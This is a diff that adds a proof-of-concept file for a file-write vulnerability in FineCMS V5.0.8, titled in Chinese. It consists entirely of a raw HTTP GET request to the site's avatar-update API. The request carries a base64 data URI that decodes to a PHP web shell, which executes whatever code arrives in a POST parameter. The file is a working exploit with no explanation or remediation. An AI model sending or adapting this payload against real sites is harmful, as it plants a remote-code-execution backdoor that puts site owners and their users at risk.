@@ -1,0 +1,8 @@
+# finecmsV5.0.8写文件漏洞
+GET /index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,eGJzaGVsbCUzQyUzRnBocCUwQSUyNHN0JTIwJTNEJTIwQGNyZWF0ZV9mdW5jdGlvbiUyOCUyNyUyNyUyQyUyMCUyNF9QT1NUJTVCJTI3aHhxOTkxMjE3JTI3JTVEJTI5JTNCJTBBJTI0c3QlMjglMjklM0I= HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
